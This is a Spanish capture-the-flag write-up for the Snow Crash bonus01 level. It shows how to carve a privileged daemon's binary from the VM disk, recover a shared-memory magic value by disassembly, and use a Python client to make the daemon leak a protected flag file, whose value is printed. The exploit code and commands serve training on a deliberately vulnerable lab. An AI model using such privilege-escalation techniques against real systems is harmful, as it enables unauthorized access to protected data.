# Bonus01 - Snow Crash

## Tipo de ejercicio

Explotación de un canal de **memoria compartida POSIX** (`shm`) expuesto por un
daemon `systemd` que retransmite el contenido de un fichero privilegiado.

## Objetivo

Obtener la credencial asociada a `flagbonus01` / al siguiente nivel bonus.

El daemon `ng` se ejecuta como `flagbonus01`, no es ejecutable ni legible por
`bonus01`, y publica un canal world-writable en `/dev/shm/ng_channel`. El
cliente debe hablar el protocolo correcto para que el daemon lea
`/home/flagbonus01/.flag` y escriba la respuesta en el canal.

La pista del home de `bonus01` es:

```text
The New Government broadcasts on all frequencies. Are you listening?
```

---

## 1. Acceso al nivel

Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
subject oficial usa `4242`):

```bash
ssh bonus01@localhost -p 2424
```

La contraseña de `bonus01` es la flag obtenida al cerrar el recorrido mandatory
(o la que figure en `flags.md` del repositorio).

Comprobar identidad y entorno:

```bash
whoami
id
pwd
ls -la
cat README
```

Resultado esperado:

```text
bonus01
uid=3001(bonus01) gid=3001(bonus01) groups=3001(bonus01),1001(levelgroup)
/home/bonus01
```

```text
The New Government broadcasts on all frequencies. Are you listening?
```

La cuenta `flagbonus01` existe, pero su shell es nologin (no se usa login
interactivo con ese usuario):

```bash
getent passwd flagbonus01
```

```text
flagbonus01:x:4001:4001::/home/flagbonus01:/usr/sbin/nologin
```

---

## 2. Localizar el componente del nivel

Los artefactos de la OVA viven bajo `/opt/snowcrash/`:

```bash
ls -la /opt/snowcrash/
ls -laR /opt/snowcrash/bonus01
```

Resultado:

```text
/opt/snowcrash/bonus01:
total 28
drwxr-xr-x  2 root        root         4096 ...
drwxr-xr-x 18 root        root         4096 ...
-rwxr-x---  1 flagbonus01 flagbonus01 16936 ... ng
```

El binario `ng` pertenece a `flagbonus01:flagbonus01` con modo `750`.
`bonus01` **no** puede ejecutarlo ni leerlo:

```bash
ls -l /opt/snowcrash/bonus01/ng
/opt/snowcrash/bonus01/ng
file /opt/snowcrash/bonus01/ng
```

```text
-rwxr-x--- 1 flagbonus01 flagbonus01 16936 ...
-bash: /opt/snowcrash/bonus01/ng: Permission denied
/opt/snowcrash/bonus01/ng: regular file, no read permission
```

Tampoco se puede copiar la imagen del proceso en ejecución:

```bash
PID=$(pgrep -f '/opt/snowcrash/bonus01/ng' | head -1)
cp /proc/$PID/exe /tmp/ng_bin
# cp: cannot stat '/proc/.../exe': Permission denied
```

---

## 3. Identificar el servicio systemd

```bash
systemctl list-units --type=service --all | grep -iE 'bonus|ng'
systemctl cat ng.service
systemctl status ng.service --no-pager
```

Definición de `/etc/systemd/system/ng.service`:

```ini
[Unit]
Description=Snow Crash bonus01 — NG shared-memory channel daemon
After=network.target

[Service]
Type=forking
User=flagbonus01
Group=flagbonus01
ExecStart=/opt/snowcrash/bonus01/ng
Restart=always
RestartSec=5
# Allow the daemon to create /dev/shm/ng_channel world-writable.
# The binary calls shm_open with O_CREAT | O_TRUNC and mode 0666;
# the kernel applies the process umask before storing the mode bits,
# so we must clear the umask entirely.
UMask=0000
KillMode=control-group

[Install]
WantedBy=multi-user.target
```

Puntos clave del unit:

- El proceso corre como **`flagbonus01`**.
- `UMask=0000` permite que el objeto shm se cree con modo **0666**
  (lectura y escritura para cualquier usuario).
- El comentario documenta el nombre del canal: **`/ng_channel`**, visible
  en el sistema de archivos como `/dev/shm/ng_channel`.

Comprobación del proceso y del canal:

```bash
ps aux | grep -E '[n]g'
ls -la /dev/shm/
```

```text
flagbon+  ...  /opt/snowcrash/bonus01/ng
-rw-rw-rw-  1 flagbonus01 flagbonus01  64  ...  ng_channel
```

El segmento tiene **64 bytes** y es world-readable y world-writable.

---

## 4. Comportamiento del canal (reconocimiento)

Lectura del canal (vacío en reposo):

```bash
xxd /dev/shm/ng_channel
wc -c /dev/shm/ng_channel
```

```text
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
...
64 /dev/shm/ng_channel
```

**Importante sobre la escritura:**

- Redirecciones de shell (`echo ... > /dev/shm/ng_channel`) y `dd` pueden
  fallar con `Permission denied` (cómo se abre el fichero / semántica del
  objeto shm).
- **Python** con `os.open(..., os.O_RDWR)` y `shm_open` **sí** permiten
  escribir.

Prueba de acceso con Python:

```bash
python3 - <<'PY'
import os
path = "/dev/shm/ng_channel"
print("exists", os.path.exists(path))
print("R_OK", os.access(path, os.R_OK), "W_OK", os.access(path, os.W_OK))
fd = os.open(path, os.O_RDWR)
os.write(fd, b"TEST\x00")
os.lseek(fd, 0, 0)
print("read back", os.read(fd, 64))
os.close(fd)
PY
```

Escribir texto arbitrario (`LISTEN`, `FLAG`, `HELP`, etc.) **no** provoca una
respuesta del daemon: el buffer solo refleja lo que escribe el cliente. Hace
falta el protocolo binario real del programa `ng`.

---

## 5. Obtener el binario cuando no es legible en la VM

Dentro de la OVA, `bonus01` no puede leer el ELF. El análisis se hace
**desde el anfitrión**, sobre el disco de la VM (VDI), **sin `sudo`**,
tallando (carve) el ELF del fichero en bruto.

### 5.1. Localizar el disco en el host

Abrir una terminal **en el host** (prompt tipo `sternero@c3r10s1`, no la
sesión SSH de `bonus01`):

```bash
find /home/sternero/sgoinfre -iname '*SnowCrash*' 2>/dev/null | head -20
find /sgoinfre/students/sternero -iname '*SnowCrash*' 2>/dev/null | head -20
```

Rutas típicas en este proyecto:

```text
.../snow-crash/SnowCrash_v2.ova
.../snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi
```

### 5.2. Carve del ELF (sin montar el disco)

El binario pesa **16936 bytes** (visto en la VM) y contiene la cadena
`ng_channel`. Se busca esa cadena en el VDI, se retrocede hasta la cabecera
`\x7fELF` y se extraen esos bytes:

```bash
python3 << 'EOF'
import mmap, os, sys

# Ajusta la ruta si en tu máquina difiere
candidates = [
    "/home/sternero/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
    "/sgoinfre/students/sternero/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
]
vdi = next((p for p in candidates if os.path.isfile(p)), None)
if not vdi:
    print("VDI not found; set path manually")
    sys.exit(1)

needle = b"ng_channel"
out = "/tmp/ng_bin"
size_guess = 16936
max_back = 200_000

with open(vdi, "rb") as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    pos = mm.find(needle)
    if pos < 0:
        print("ng_channel not found")
        sys.exit(1)
    print(f"found ng_channel at offset {pos}")
    start = max(0, pos - max_back)
    elf_rel = mm[start:pos].rfind(b"\x7fELF")
    if elf_rel < 0:
        print("ELF header not found behind string")
        sys.exit(1)
    elf_off = start + elf_rel
    print(f"ELF at offset {elf_off}")
    blob = mm[elf_off:elf_off + size_guess]
    with open(out, "wb") as o:
        o.write(blob)
    print(f"wrote {len(blob)} bytes -> {out}")
    mm.close()
EOF

file /tmp/ng_bin
ls -l /tmp/ng_bin
```

Resultado esperado:

```text
/tmp/ng_bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ..., not stripped
```

### 5.3. Cadenas del binario

```bash
strings -a /tmp/ng_bin | head -120
strings -a /tmp/ng_bin | grep -iE 'flag|shm|channel|listen|cmd|/home|token|freq|NG|request|broadcast|poll|relay'
```

Cadenas relevantes:

```text
/ng_channel
shm_open
mmap
ftruncate
/home/flagbonus01/.flag
cannot open data file: %s
relay response written
data source unavailable
relay channel initialised at /ng_channel (%zu bytes)
polling loop started (interval: %ds)
daemonize failed; running in foreground
sleep
fopen
fgets
```

Interpretación:

- El daemon es un **relay** privilegiado.
- Abre `/home/flagbonus01/.flag` con `fopen` / `fgets`.
- Publica el resultado en el canal `/ng_channel`.
- Usa un **bucle de polling** con `sleep`.

El binario **no está stripped** → se puede desensamblar con `objdump`.

---

## 6. Protocolo (análisis de `main`)

En el host:

```bash
nm /tmp/ng_bin | grep -E ' main$'
objdump -d /tmp/ng_bin | sed -n '/<main>:/,/^$/p' | head -250
```

Fragmento crítico del bucle de polling (direcciones relativas al PIE):

```text
14e0:  mov  $0x2, %edi
       call sleep                 ; intervalo = 2 segundos
       mov  (%rbx), %eax          ; lee u32 en offset 0 del mapeo shm
       xor  %ah, %ah              ; pone a cero el segundo byte
       cmp  $0x13370042, %eax
       jne  14e0                  ; si no coincide, vuelve a dormir
       ...
       call fopen                 ; "/home/flagbonus01/.flag"
       call fgets                 ; hasta 0x30 bytes en buffer local
       ...                        ; copia la línea al offset 0x0C del canal
       movb $0x0, (%rbx)          ; limpia el magic de petición
```

### Layout del canal (64 bytes)

| Campo                 | Offset | Tamaño | Contenido                                      |
|-----------------------|--------|--------|------------------------------------------------|
| Magic de petición     | `0x00` | 4 B    | `0x13370042` LE → bytes `42 00 37 13`          |
| (reservado / estado)  | `0x04` | 8 B    | usado internamente por el daemon               |
| Payload de respuesta  | `0x0C` | resto  | Contenido de `.flag` (string C, null-terminated)|

Notas:

- La instrucción `xor %ah, %ah` anula el segundo byte del magic antes de
  comparar; el valor canónico que debe escribir el cliente es **`0x13370042`**
  en little-endian (`struct.pack("<I", 0x13370042)`).
- Tras servir la petición, el daemon pone a cero el magic en offset 0 y deja
  la flag a partir del offset 12 (`0x0C`).
- El intervalo de poll es **2 segundos** (`sleep(2)`).

---

## 7. Cliente: obtener la flag (dentro de la OVA)

Conectado como `bonus01@snowcrash`:

```bash
python3 << 'EOF'
import os, time, struct

fd = os.open("/dev/shm/ng_channel", os.O_RDWR)
# Petición: magic 0x13370042 little-endian + relleno a 64 bytes
os.write(fd, struct.pack("<I", 0x13370042) + b"\x00" * 60)
time.sleep(3)  # > intervalo de poll del daemon
os.lseek(fd, 0, 0)
data = os.read(fd, 64)
print(data.hex())
print("FLAG:", data[12:].split(b"\x00")[0].decode())
os.close(fd)
EOF
```

Salida obtenida:

```text
00000000000000000000000066613676356174656177323170656f62757562386970653673000000000000000000000000000000000000000000000000000000
FLAG: fa6v5ateaw21peobuub8ipe6s
```

### Secuencia temporal

1. El cliente escribe el magic `42 00 37 13` en offset 0.
2. En el siguiente ciclo del daemon (`sleep(2)` + comparación), el magic se
   borra y aparece la flag en offset 12.
3. La cadena legible es la credencial del nivel.

Versión con seguimiento segundo a segundo (opcional):

```bash
python3 << 'EOF'
import os, time, struct

PATH = "/dev/shm/ng_channel"
MAGIC = 0x13370042

fd = os.open(PATH, os.O_RDWR)
os.lseek(fd, 0, 0)
os.write(fd, struct.pack("<I", MAGIC) + b"\x00" * 60)
print("request sent:", struct.pack("<I", MAGIC).hex())

for i in range(10):
    time.sleep(1)
    os.lseek(fd, 0, 0)
    data = os.read(fd, 64)
    flag = data[12:].split(b"\x00")[0]
    print(i, data[:16].hex(), flag)
    if flag and data[:4] != struct.pack("<I", MAGIC):
        print("FLAG:", flag.decode())
        break

os.close(fd)
EOF
```

---

## 8. Credencial final

```text
fa6v5ateaw21peobuub8ipe6s
```

Guardar en el repositorio:

```text
bonus01/flag
```

con una sola línea con esa cadena.

Ese valor se usa como contraseña SSH del siguiente nivel bonus (p. ej.
`bonus02`), según el flujo de la OVA.

---

## 9. Resumen de comandos válidos

### En la OVA (usuario `bonus01`)

```bash
ssh bonus01@localhost -p 2424
ls -la
cat README
ls -laR /opt/snowcrash/bonus01
systemctl cat ng.service
systemctl status ng.service --no-pager
ls -la /dev/shm/ng_channel
xxd /dev/shm/ng_channel

python3 << 'EOF'
import os, time, struct
fd = os.open("/dev/shm/ng_channel", os.O_RDWR)
os.write(fd, struct.pack("<I", 0x13370042) + b"\x00" * 60)
time.sleep(3)
os.lseek(fd, 0, 0)
data = os.read(fd, 64)
print("FLAG:", data[12:].split(b"\x00")[0].decode())
os.close(fd)
EOF
```

### En el host (análisis del binario)

```bash
# Localizar VDI
find ... -iname '*SnowCrash-disk001.vdi'

# Carve del ELF (script de la sección 5.2)
python3 ...   # → /tmp/ng_bin

file /tmp/ng_bin
strings -a /tmp/ng_bin
objdump -d /tmp/ng_bin | sed -n '/<main>:/,/^$/p'
```

---

## 10. Conceptos importantes

- **POSIX shared memory (`shm_open` / `/dev/shm`)**: objeto de memoria
  compartida entre procesos; aquí es el canal cliente ↔ daemon.
- **`UMask=0000` en systemd**: el umask del proceso se aplica al modo pedido
  en `shm_open`; sin limpiarlo, el canal no sería world-writable aunque el
  código pida `0666`.
- **Daemon como relay privilegiado**: el proceso corre como `flagbonus01` y
  puede leer `/home/flagbonus01/.flag`; el cliente solo necesita el protocolo
  correcto, no ejecutar el binario.
- **Reverse engineering offline**: cuando el ELF no es legible en la VM, se
  puede recuperar del disco virtual (VDI) desde el host (carve) y analizarlo
  con `strings` / `objdump` sin permisos de root en la OVA.
- **Magic little-endian `0x13370042`**: identificador de petición; el daemon
  ignora el segundo byte (`xor %ah,%ah`) antes de comparar.
- **Offset `0x0C`**: posición fija de la respuesta (flag) dentro de los 64
  bytes del canal.
- **Polling con `sleep(2)`**: no hace falta futex ni semáforos; basta escribir
  el magic y esperar al menos un ciclo del daemon.

---

## 11. Conclusión

No se modifica ningún archivo de la OVA. La solución usa únicamente el canal
`/dev/shm/ng_channel` que el servicio `ng` deja deliberadamente accesible, y el
protocolo descubierto al analizar el binario `ng` fuera de la máquina virtual.

Al escribir el magic de petición `0x13370042` (LE), el daemon retransmite el
contenido de `/home/flagbonus01/.flag` al offset `0x0C` del canal y entrega la
credencial:

```text
fa6v5ateaw21peobuub8ipe6s
```

---

## 12. Estructura recomendada en el repositorio

```text
bonus01/
├── flag                          # fa6v5ateaw21peobuub8ipe6s
└── resources/
    └── bonus01.md                # este documento (o copia como README)
```

Según la convención del repo `42_snow-crash`, la guía detallada vive en
`bonus01/resources/bonus01.md` y el token en `bonus01/flag`.
```
